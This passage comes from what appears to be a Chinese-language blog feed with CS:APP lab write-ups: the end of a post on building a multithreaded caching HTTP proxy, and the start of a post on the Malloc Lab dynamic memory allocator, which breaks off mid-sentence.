</b>，将自动进行测试。其中，第一部分40分，其余各15分，满分为70。但本实验的测试比较水，基本不需要考虑效率的问题，因此难度更降了一层。并且，csapp.c文件中将我们需要的大量的函数都进行了包装，直接调用即可。tiny.c文件也为我们写好了，在完成的时候，可以直接先复制过来。并且，后面B和C部分其实照着书打也就可以拿到满分了。</p><h2 id="some-notice"><a href="#some-notice" class="headerlink" title="some notice"></a>some notice</h2><p>　　1. 在笔者的电脑上(arch linux系统)，使用<b> ./driver.sh </b>命令时，发现报错了，显示<b> command not found </b>。解决的办法时安装需要的对应软件。在arch下，下载net-tools包即可解决，其他系统应该也是类似的。<br>　　2. 在bash中，可以使用命令<b> ./tiny 46350 &amp; </b>，在46350端口运行server，并且在后台运行，方便调试。具体可能会用到的还有以下这些命令(具体作用不清楚的话可以查一下)：</p><blockquote><p>kill pid<br>fg jid<br>bg jid<br>jobs</p></blockquote><p>　　3. 当完成某个部分时，可以使用命令<em> curl –proxy localhost:46351 localhost:46350 </em>在本地对代理进行测试，并且可以在文件中输出一些信息，有利于调试。<br>　　4. 和服务器建立连接后，记得把文件描述符回收了，否则不仅占用资源，甚至会导致文件描述符不够用的情况。还有，要十分小心内存泄漏的问题，比如本实验中可能会用到malloc函数，别忘了回收。还有part B部分需要用到多线程，记得使用在子线程中使用pthread_detach(pthread_self())，保证线程资源能自动被系统回收。(也可以使用pthread_join()函数)。</p><h2 id="实验正文"><a href="#实验正文" class="headerlink" title="实验正文"></a>实验正文</h2><p>　　如果需要完整代码，请见<a href="https://github.com/little-csd/csapp_lab/blob/master/proxylab-handout/proxy.c" target="_blank" rel="noopener">github</a>，仅供参考。本处仅讲几个比较重要的点。</p><h3 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h3><p>　　想要完成本实验，必须对http协议的基本结构有一定的了解。因此，这里给出一个简单的http请求。</p><blockquote><p>GET / HTTP/1.1<br>Host: localhost<br>Content-Length: 40<br>Connection: close</p><p>&lt;html><br>…<br>&lt;/html></p></blockquote><p>　　如上。第一行为请求行，格式为”%s %s %s”，三个字符串间均有一个空格。其中，第一个字符串表示的是请求的类型(GET或HEAD或POST等)；第二个字符串表示的是文件的位置，如果以‘/’字符结尾，则自动加上index.html(或home.html)；第三个字符串表示的是版本，一般为“HTTP/1.1”，但这个实验要求我们向server发送信息时必须使用“HTTP/1.0”。<br>　　第二行开始是请求头，连续若干行，表示该请求相关的一些信息等。在本实验中，请求头需要有以下内容：</p><blockquote><p>Connection: close<br>Proxy-Connection: close</p></blockquote><p>　　用来表示服务端与用户端仅进行一次数据交换。在HTTP/1.0中，默认情况下是“Keep-Alive”。<br>　　请求头后有一个<b>空行</b>，这里要注意一下，该空行用来分离请求头与请求数据，不能省略。<br>　　随后的若干行均为请求数据，可以包含任意数据。</p><p>　　对于响应消息，其实和请求很相似。</p><blockquote><p>HTTP/1.0 200 OK<br>Server: Tiny Web Server<br>Connection: close<br>Content-length: 115<br>Content-type: text/html</p><p>Welcome to little_csd.net<br>Thanks fot you visited.</p></blockquote><p>　　如上面为一个简单的相应信息。第一行为状态行，同样包含三个以单个空格隔开的字符串。第一个字符串表示协议，在这里是“HTTP/1.0”，第二个字符串表示的是状态码，第三个字符串表示的是状态消息，和状态码相对应。正常情况下，状态码和状态消息应该分别为”200”和“OK”。<br>　　第二行开始为消息报头，为客户端提供一些关于响应消息的信息，比如消息长度(仅含正文)，消息类型等。<br>　　消息报头后紧接着又是一个空行，用来分隔。最后是响应正文。<br>　　有一点值得注意的是，http协议中，换行是由回车符‘\r’和换行符’\n’组成的，每一行结尾都需要添加这两个字符。</p><h3 id="实现代理的基本思路"><a href="#实现代理的基本思路" class="headerlink" title="实现代理的基本思路"></a>实现代理的基本思路</h3><p>　　首先，我们必须明白代理是干什么用的。这样才能准确清楚我们要做什么。如同字面上的意思，代理起到一个类似中间商的作用。当我们利用代理访问某些网络资源的时候，我们客户端首先向代理发送信息，告诉它我们要访问的资源的位置。然后，代理就代替我们访问该资源(比如发送HTTP请求给服务端)，服务端收到访问请求之后，将资源传回给了代理，代理接收后，又发送到我们客户端这边。这样我们就成功地间接访问到了该网络资源。这里以访问<a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a> 为例，用一张简单的图来说明一下。<br><img src="/2019/02/22/csapp-Proxylab/proxy.png" alt="proxy"><br>　　那么，为什么我们不能直接访问<a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a> 呢？答案显而易见了，<a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a> 被墙屏蔽了，在中国大陆境内访问不了(ipv4协议下)。因此，这就是代理的好处之一。通过访问另一台在墙外的主机，由它帮我们去访问一些被墙的网站，然后再返回给我们，这样我们就成功地间接访问到了我们想要的资源了。<br>　　当然，代理还有另一个重要的好处，它可以便于我们实现缓存。我们知道，如果我们每次都直接访问服务器，那么势必会给服务器带来巨大的压力，甚至导致服务器瘫痪。而我们如果代理的时候，它可以自动进行页面的缓存，这样下一次我们再访问同一个资源的时候，代理就不需要向服务器发送请求，直接从本地的缓存中拿出页面文件，然后送回给我们即可，这同时也提高了访问的效率。<br>　　好了，接下来我们考虑如何实现了。考虑到同样需要监听某个端口，我们可以直接复制tiny.c中的代码，进行适当的修改即可。(事实上我们只需要更改响应的逻辑)。<br>　　和客户端建立连接之后，我们需要读取客户端发送过来的请求，然后进行解析，得到客户端想要访问的主机，然后和对应的主机建立连接，发送HTTP请求(这里要十分注意HTTP请求的格式问题，容易出错)。然后，接收服务端的响应消息，原封不动地传回给客户端即可。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET http:<span class="comment">//localhost:46350/ HTTP/1.1</span></span><br><span class="line">Host: localhost:<span class="number">46350</span></span><br><span class="line">User-Agent: curl/<span class="number">7.63</span><span class="number">.0</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Proxy-Connection: Keep-Alive</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">GET http://localhost:46350/ HTTP/1.1</span></span><br></pre></td></tr></table></figure></p><p>　　上面展示的是，使用之前提到的curl命令后，代理收到的请求。我们只需要取请求头的url，获取主机(这里为localhost)，端口号(这里为46350)，文件位置为’/‘，然后我们只需要制作一个HTTP请求发给服务器即可。在我的proxy实现中，HTTP请求如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.0</span></span><br><span class="line">Host: localhost:<span class="number">46350</span></span><br><span class="line">Connection: close</span><br><span class="line">Proxy-Connection: close</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (X11; Linux x86_64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">71.0</span><span class="number">.3578</span><span class="number">.98</span> Safari/<span class="number">537.36</span></span><br><span class="line">       <span class="comment">// 这个空行别漏了</span></span><br></pre></td></tr></table></figure></p><h3 id="添加多线程"><a href="#添加多线程" class="headerlink" title="添加多线程"></a>添加多线程</h3><p>　　前面说到了实现代理的基本思路，然而实际的服务器如果这样做的话，效率是很低的。我们一次只能处理一个访问请求，这样不合要求。因此，我们可以采用多线程的方法，通过多个线程一起工作来处理消息。当然，最简单的方法是，当接收到一个消息的时候，我们就创建一个线程，然后对消息进行处理。尽管这样就可以拿到该部分的满分了，但我们知道，创建一个线程，对系统来说时间和资源的开销是比较大的，每次接收到消息后就创建线程显然是不明智的，会导致时间上的浪费。因此，在这里我选择了采用预线程化的方法(类似与java中的线程池)，加上书中提到的producer-consumer模式来完成。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">doit</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Pthread_detach(pthread_self());</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> connfd = sbuf_remove(&amp;sbuf); <span class="comment">// 从消息队列中移除某个消息并返回，这里会阻塞</span></span><br><span class="line">        forward(connfd); <span class="comment">// 处理某个客户端的消息</span></span><br><span class="line">        Close(connfd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　我们选择在一开始就创建线程，然后让线程进入上述函数，这样它就进入了一个无限的循环当中。在sbuf_remove函数中，如果消息队列为空，线程将一直被阻塞，直到拿到消息。sbuf_t相关的一些函数如下，基本的写法其实和书里是一样的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>* buf;   <span class="comment">// 队列数组</span></span><br><span class="line">    <span class="keyword">int</span> n;      <span class="comment">// 队列最大容量</span></span><br><span class="line">    <span class="keyword">int</span> front，rear;  <span class="comment">// 用于构造队列</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">sem_t</span> mutex;</span><br><span class="line">    <span class="keyword">sem_t</span> slots;</span><br><span class="line">    <span class="keyword">sem_t</span> items;</span><br><span class="line">&#125; <span class="keyword">sbuf_t</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_init</span><span class="params">(<span class="keyword">sbuf_t</span> *sp, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_deinit</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_insert</span><span class="params">(<span class="keyword">sbuf_t</span> *sp, <span class="keyword">int</span> item)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sbuf_remove</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span>;</span><br></pre></td></tr></table></figure></p><h3 id="添加缓存"><a href="#添加缓存" class="headerlink" title="添加缓存"></a>添加缓存</h3><p>　　对于一个比较完善的代理而已，缓存是不可或缺的。要实现缓存，我们需要把代理接收到的服务器的消息保存下来以及请求地址保存下来，然后，每次收到一个消息的时候，我们需要先在缓存中查找，如果在缓存中发现之前有过一个同样的请求，那么只需要直接从缓存中拿出，然后放回给客户端即可。<br>　　当然，这里又有另外一个问题，就是我们的缓存策略。正常情况下，比较恰当的缓存方法应该是LRU。当然，这里我偷懒了，采用的是FIFO，即先进先出策略。当缓存的页面数已满或者缓存的总大小超过了我们的设定的上限的时候，我们就将最远的一个缓存对象从缓存中移除。具体的写法见下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> cache[MAX_OBJECT_SIZE]; <span class="comment">// 页面的内容</span></span><br><span class="line">    <span class="keyword">char</span> dst[MAXLINE];  <span class="comment">// 请求地址</span></span><br><span class="line">    <span class="keyword">int</span> size;  <span class="comment">// 页面大小</span></span><br><span class="line">&#125; web_obj;   <span class="comment">// 缓存的对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    web_obj* obj;  <span class="comment">// 缓存对象，这里是一个数组</span></span><br><span class="line">    <span class="keyword">int</span> size_all;  <span class="comment">// 所有缓存对象页面内容的总大小</span></span><br><span class="line">    <span class="keyword">int</span> n;         <span class="comment">// 缓存对象数的最大值</span></span><br><span class="line">    <span class="keyword">int</span> objn_cnt;  <span class="comment">// 当前缓存的对象数</span></span><br><span class="line">    <span class="keyword">int</span> read_cnt;    <span class="comment">// 用于</span></span><br><span class="line">    <span class="keyword">int</span> front, rear; <span class="comment">// 用于队列的构造</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">sem_t</span> mutex;   <span class="comment">// web_cache访问锁</span></span><br><span class="line">    <span class="keyword">sem_t</span> write;   <span class="comment">// 写入的锁，这里采用了读者优先模式</span></span><br><span class="line">&#125; web_cache;</span><br><span class="line"></span><br><span class="line">void cache_init(web_cache *cache, int n)；</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cache_remove</span><span class="params">(web_cache *cache, <span class="keyword">int</span> pos)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">cache_find</span><span class="params">(web_cache *cache, <span class="keyword">char</span>* dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 这里需要加锁操作</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i, n = cache-&gt;n;</span><br><span class="line">    <span class="keyword">int</span> l = (cache-&gt;front+<span class="number">1</span>) % n, len = cache-&gt;objn_cnt;</span><br><span class="line">    <span class="keyword">char</span> *ans;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        web_obj *obj = cache-&gt;obj + l;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(obj-&gt;dst, dst)) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = obj-&gt;size;</span><br><span class="line">            ans = Malloc(size);  <span class="comment">// 重新开辟一段存储空间</span></span><br><span class="line">            <span class="built_in">strcpy</span>(ans, obj-&gt;cache);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        l = (l + <span class="number">1</span>) % n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里将锁还回</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i == len) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cache_put</span><span class="params">(web_cache *wcache, <span class="keyword">char</span> *dst, <span class="keyword">char</span> *cache)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    P(&amp;wcache-&gt;write);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> cnt = wcache-&gt;objn_cnt, n = wcache-&gt;n;</span><br><span class="line">    <span class="keyword">if</span> (cnt == n) &#123;</span><br><span class="line">        <span class="keyword">int</span> pos = (wcache-&gt;front+<span class="number">1</span>) % n;</span><br><span class="line">        cache_remove(wcache, pos);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pos = (++wcache-&gt;rear) % n, size = <span class="built_in">strlen</span>(cache);</span><br><span class="line">    web_obj *obj = wcache-&gt;obj + pos;</span><br><span class="line">    <span class="built_in">strcpy</span>(obj-&gt;dst, dst);</span><br><span class="line">    <span class="built_in">strcpy</span>(obj-&gt;cache, cache);</span><br><span class="line">    obj-&gt;size = size;</span><br><span class="line"></span><br><span class="line">    wcache-&gt;size_all += size;</span><br><span class="line">    wcache-&gt;objn_cnt++;</span><br><span class="line">    <span class="keyword">while</span>(wcache-&gt;size_all &gt; MAX_CACHE_SIZE) &#123;</span><br><span class="line">        <span class="keyword">int</span> pos = (wcache-&gt;front+<span class="number">1</span>) % n;</span><br><span class="line">        cache_remove(wcache, pos);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    V(&amp;wcache-&gt;write);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　整个缓存的模型上面已经展示得很清楚了，但有几个需要十分小心的点。第一个是find的时候，由于有加锁的存在，我们可以保证在当前某线程在搜索的时候，所有缓存对象不会因写入而发生更改，并且，统一时间最多只能有一个线程在遍历缓存对象。但是，当缓存命中的时候，我们需要返回什么？如果直接将缓存对象的指针返回，看似是没有问题的，但该函数如果在还锁之后，线程突然被挂起，然后有另一个线程执行了写操作，恰好将我们返回的那个缓存对象覆盖了。这个时候之前的那个线程重新执行，它返回的指针指向的对象这个时候其实就已经发生变化了。这个一定要理解清楚。<br>　　因此，我们选择了将重新开辟一段存储空间，将缓存对象的页面内容放在上面，这个时候，正常情况下，这段空间的内容就不会被其他线程修改了，于是，页面的内容可以正确地返回给了调用它的函数。但是这里又有另一个问题，我们开辟了一段存储空间，同时也需要对其进行回收，因此这就要求了调用cache_find()的函数，在获得了页面对象并使用了之后，需要将该段内容回收。</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>　　终于又到了总结的时候了。对这个实验，尽管难度不大，但我们还是可以从其中学会很多东西。比如HTTP请求和响应的一些格式问题，我们能从应用层了解到网络访问是如何实现的。并且，我们也了解到了多线程技术，正确地使用的情况下，可以很大程度上提高程序的效率，并且充分利用了多核CPU的计算能力。当然，这也同时带来了一系列的问题，比如多线程之间的竞争，处理不当会导致程序每次执行的结果都不一样。以及多线程之间共享对象的读写，我们引用了锁的概念，这又带来了一系列新的问题，当一个线程一直持有锁，会导致其他线程被饿死(starvation)，又或者一个线程持有锁的同时又被挂起，导致陷入了死锁(dead lock)，这一系列都是会对我们的程序造成很大影响的错误。由此，线程安全对与一个编程者而言，重要性不言而喻。<br>　　最后，还是要来对整个系列做一个小总结的。从去年12月初开始，到今天2月底为止，历时两个多月，终于把这CS:APP3e看完了，并且完成了所有的实验，大部分也都写了认真地写完了相应的博客。怎么说呢，这段时间对我来说收获确实还是很大的，从一个对系统底层几乎毫不了解的小萌新，到现在对CPU，程序等有了一个简单的认识，这一步的跨越还是很大的，很感谢推荐这本书给我的师兄们。<br>　　这个系列到今天为止应该也就结束了。很意外的是，基本上自己还是勉勉强强完成了当初给自己立下的flag。接下来的一段时间应该博客就不会有更新了，可能下一个考虑学一下计网吧(如果有可能的话，会做一下上面的实验并写几篇博客)。<br>　　皆さん、さよなら<br><img src="/2019/02/22/csapp-Proxylab/end.jpeg" alt="end"></p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> proxy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>csapp-Malloclab</title>
      <link href="/2019/02/14/csapp-Malloclab/"/>
      <url>/2019/02/14/csapp-Malloclab/</url>
      
        <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>　　这是csapp系列的第七篇文章。具体题目请见<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">官网</a>。本文主要讲csapp中的malloc lab的一些问题以及解决办法。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话，可能要稍微等一会)。<br>　　建议在开始实验以前，先把官方的<a href="http://csapp.cs.cmu.edu/3e/malloclab.pdf" target="_blank" rel="noopener">资料</a>看下。然后，本实验总体难度偏高，至少算是笔者目前花的时间最多的一个实验(算上各种调试，以及写博客花了大概三天吧)，强烈建议把书里显式分配列表的地方看得十分清楚再开始写，不然一开始会无从下手。同样的，本实验需要对数据的存储(chapter 2)，指针等内容有一定的了解，需要经常用到各种类型转换。<br>　　倘若你是在官网上下的文件的话，建议找一下<a href="https://github.com/Ethan-Yan27/CSAPP-Labs/tree/master/yzf-malloclab-handout/traces" target="_blank" rel="noopener">完整的trace文件</a>，官网中仅含有两个简单的测试文件，没办法进行较大的数据的测试。</p><h2 id="mallco-的简单实现原理"><a href="#mallco-的简单实现原理" class="headerlink" title="mallco 的简单实现原理"></a>mallco 的简单实现原理</h2><h3 id="内存空间的申请"><a href="#内存空间的申请" class="headerlink" title="内存空间的申请"></a>内存空间的申请</h3><p>　　在不使用malloc的情况下，通常我们需要使用系统调用来获得内存，其中最主要有两个方式。<br>　　第一个是sbrk(brk)函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">brk</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *addr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sbrk</span><span class="params">(<span class="keyword">intptr_t</span> incr)</span></span>;</span><br></pre></td></tr></table></figure></p><p>　　brk的作用是将堆顶指针设置为addr，失败返回0，成功返回1。而sbrk的作用是将堆顶指针增加incr个字节，成功返回新的堆顶地址。<br>　　第二种方法使用的是mmap函数，利用匿名映射来实现。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *start, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">munmap</span><span class="params">(<span class="keyword">void</span> *start, <span class="keyword">size_t</span> length)</span></span>;</span><br></pre></td></tr></table></figure></p><p>　　其中，start指针表示想要映射的内存区域的起始地址，length为映射的大小，prot是保护标志，flags是映射的类型(匿名映射使用MAP_ANONYMOUS参数)，offset是偏移量。<br>　　munmap则是将映射的空间还给操作系统。<br>　　当然，mmap还有另一个重要的作用就是实现快速的I/O，它通过直接将文件映射到虚拟内存，可以直接对其进行读写操作，而不需要使用系统调用read/write，大幅度提高了速度。当然，它只适用于内容的更新，而不适用于内容的添加。同理，使用mmap还可以实现共享内存。</p><p>　　在实际的使用中，我们不可能每次需要内存的时候，都用sbrk或mmap函数(系统调用速度很慢)，这会大幅度降低我们程序的效率。通常我们采用的是一种类似于缓存的思想，使用sbrk函数向内核索取一大片的内存空间，然后，我们再使用一定的手段对这段空间进行管理，当这段空间不够用时，再向内核拿，这样就提高了效率。这也正是malloc函数库所起到的作用。</p><h3 id="malloc-amp-free"><a href="#malloc-amp-free" class="headerlink" title="malloc &amp; free"></a>malloc &amp; free</h3><p>　　简单来说，malloc函数主要是通过维护一个空闲列表来实现内存的管理的，具体涉及到的数据结构就是链表。对每一个内存块，我们使用链表将它们串在一起，当需要使用的时候，我们从链表中寻找大小适合的内存块，并且从空闲链表中删除，拿给用户。<br>　　当用户用完某个内存块的时候，我们就将其重新插入回空闲链表，这样就实现了简单的内存分配和释放。</p><p>　　但是，这样的实现很明显空间利用率太低了，如果我们当前有个10kb的块，而用户仅需要1kb，这个时候直接分配就过于浪费，因此我们需要对这个块进行切割，拿出1kb给用户，剩下9kb重新放回链表，这样就可以提高一定的利用率。<br>　　但我们又发现，如果一个很大的块一直被切割，最后剩下的都是一些零碎的内存块，这个时候我们如果需要一个很大的内存块，这就有问题了，因此，我们需要合并。将几个临近的空闲块合成一个大的块，这样在需要大块内存的时候才有办法。</p><h2 id="malloc-lab"><a href="#malloc-lab" class="headerlink" title="malloc lab"></a>malloc lab</h2><p>　　这个实验，要求我们完成一个动态内存分配器，即模拟libc库中的malloc, free, realloc等函数的功能。本实验我们仅需在mm.c文件中修改，其他的文件我们不需要进行改动（原始的mdriver.c可能会报错，根据提示自行修改即可，或者也可以无视）。最后我们的成绩是用时间效率(每秒操作数)和空间效率(共用了多少空间)衡量。当然，在本实验中，最大的难点在于空间效率的利用上。</p><blockquote><p>实验文件：<br>mm.c 我们需要填写的文件<br>mdriver.c 用于测试我们的程序<br>memlib.c 模拟内存系统，含有mem_sbrk等函数</p></blockquote><blockquote><p>需要填写的函数：<br>int mm_init(void)<br>void *mm_malloc(size_t size)<br>void mm_free(void *ptr);<br>void *mm_realloc(void *ptr, size_t size);</p></blockquote><blockquote><p>实验要求及一些注意事项</p><ol><li>在本实验中，尽量将所有的结构(链表头等)放在堆内存当中，尽量少定义全局变量。</li><li>64位与32位的问题。我们运行的机器应该是64位的，但是在目前csapp官网的makefile文件中有 -m 32 的编译选项，也就是说所有的指针均为32位，即占用4个字节，这点要注意。在某些linux系统中，电脑中可能没有对应的32位的库，因此在编译的时候会显示找不到库，根据自身系统自行下载即可。</li><li>本实验要求实现8-bytes对齐，也就是说，mm_malloc返回的指针均为8的倍数。</li><li>建议在确定好block的组织方式后，完成mm_check()函数，用于检查堆内存是否出现问题。</li><li>建议将trace文件夹放在mdriver所在文件夹中，并且更改config.h文件当中TRACEDIR的宏定义为<br>#define TRACEDIR “traces/“。<br>make之后就可以直接运行./mdriver进行全部测试<br>也可以使用./mdriver -f <filename>命令对某个文件进行测试</filename></li><li>对于一些奇怪的段错误，不妨采用打印堆内存的信息，或者模拟指令，或者自己造一个小文件进行测试等。</li></ol></blockquote><p>　　在正式开始实验以前，请确保理解以下概念(包括各自的特点，优缺点等)：<br>　　1. 三种适配方式：<br>　　　- fitst fit<br>　　　- next fit<br>　　　- best fit<br>　　2. 三种空闲列表的组织方式<br>　　　- implicit free list<br>　　　- explicit free list<br>　　　- segregated free list<br>　　3. 两种合并的方式<br>　　　- immediate coalescing<br>　　　- deferred coalescing<br>　　4. 两种内存碎片<br>　　　- internal fragmentation<br>　　　- external fragmentation<br>　　5. 空间列表的排序方式<br>　　　- size order<br>　　　- address order</p><h3 id="适配方式"><a href="#适配方式" class="headerlink" title="适配方式"></a>适配方式</h3><p>　　first fit: 最为直接的办法。扫描所有的块，只要当前块的大小满足要求就使用，速度较快。但容易导致空闲列表中前面的块被不断地细分，而后面的一些块却一直迟迟得不到利用。<br>　　second fit: 扫描的时候，每次从上一次扫描的下一个块开始，这样可以使得整个列表的块都可以被使用，这使得效率更高。然而，实际应用中，作用也很有限，容易产生很大的空间浪费，造成大量碎片。<br>　　best fit：这种方式最大的好处是可以充分地利用空间。找到所有满足要求的块中最小的那一个，这样可以很大程度上避免浪费。当然，这也使得时间成本较高，尤其是如果空间链表的组织方式不太恰当的话，容易导致每次都要遍历一整个列表。<br>　　在本实验中，要拿到高分一般采用的是best fit。</p><h3 id="列表的组织方式"><a href="#列表的组织方式" class="headerlink" title="列表的组织方式"></a>列表的组织方式</h3><p>　　implicit free list：这种方式最为简单，直接将所有的块(不管是否有分配)串在一起，然后遍历。这种方式可也使得块最小可以达到8 bytes。当然，这种方式效率很低，尤其是当块的数量较多的时候。<br>　　explicit free list：在每一个free 块中保存两个指针，将所有空闲的块组成一个双向链表。和隐式相比，这种方式最大的好处在于我们不需要遍历已经分配的块，速度上快了很多，当然，由于需要保存指针，所以每一个块最小为16 bytes。<br>　　segregated free list：这种方式的特点在于，根据块的不同大小，分成k组，组织成k条双向链表。分类的方式有很多，比如可以采用2的倍数的分类方式，{1},{2},{3~4},{5~8}……大小为6的块放在第四条链中，大小为3的块则放在第三条链中等等。在本实验中，笔者采用的分类是{1~16},{17~32},{33~64},{65~128},{129~256},{257,512},{513~1024},{1025~2048},{2049~4096},{4096~…};</p><h3 id="两种内存碎片"><a href="#两种内存碎片" class="headerlink" title="两种内存碎片"></a>两种内存碎片</h3><p>　　internal fragmentation：内部碎片，即是已经被分配出去（能明确指出属于哪个进程）却不能被利用的内存空间。比如当前我需要44 bytes的内存，然后malloc的时候分配到了一个48 bytes的块，这样的话，剩下的4 bytes的内存尽管我不需要用到，但是其他程序也无法使用，这就是内部碎片。<br>　　external 